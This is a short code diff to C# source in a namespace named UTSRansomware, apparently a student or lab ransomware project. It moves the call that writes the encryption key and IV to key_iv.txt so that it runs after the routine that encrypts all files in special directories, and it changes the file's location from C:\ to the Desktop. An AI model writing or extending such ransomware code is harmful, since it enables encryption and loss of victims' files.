@@ -19,7 +19,6 @@ namespace UTSRansomware
         {
             this.key = GenerateKey();
             this.iv = GenerateIV();
-            SaveKeyAndIvToDesktop();
         }
 
         // Loops over special directories and encrypts all files in them
@@ -46,6 +45,7 @@ namespace UTSRansomware
 
                 }
             }
+            SaveKeyAndIvToDesktop();
         }
 
         // Encrypts all files in a directory, recursviely calls istelf to encrypt files in sub directories
@@ -123,7 +123,8 @@ namespace UTSRansomware
 
         private void SaveKeyAndIvToDesktop()
         {
-            string fileName = Path.Combine(@"C:\", "key_iv.txt");
+            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string fileName = Path.Combine(desktopPath, "key_iv.txt");
 
             // Convert key and IV to Base64 strings
             string keyAsString = Convert.ToBase64String(this.key);
